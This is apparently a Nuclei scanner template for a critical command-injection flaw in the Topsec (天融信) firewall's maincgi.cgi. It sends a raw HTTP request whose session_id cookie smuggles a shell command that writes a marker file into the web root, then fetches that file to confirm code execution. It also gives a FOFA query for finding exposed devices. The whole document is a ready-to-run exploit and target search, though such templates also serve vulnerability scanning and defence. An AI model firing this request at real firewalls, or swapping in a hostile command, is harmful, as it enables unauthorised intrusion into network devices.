http:
    - matchers:
        - dsl:
            - status_code_2 == 200 && contains(body_2,'www.cnvd.org.cn')
          type: dsl
      raw:
        - "GET /cgi/maincgi.cgi?Url=aa HTTP/1.1\nHost: {{Hostname}}\nCookie: session_id_443=1|echo 'www.cnvd.org.cn' > /www/htdocs/site/image/{{v1}}.txt;\nUser-Agent: Moziilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36 \n"
        - |
          GET /site/image/{{v1}}.txt HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
id: topsec-maincgi-cookie-rce
info:
    author: wuha
    metadata:
        fofa-query: title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
        verified: true
    name: 天融信防火墙 Cookie 参数命令执行漏洞
    severity: critical
    tags:
        - topsec
        - tianrongxin
        - fileupload
        - 天融信防火墙
variables:
    v1: '{{rand_base(5)}}'
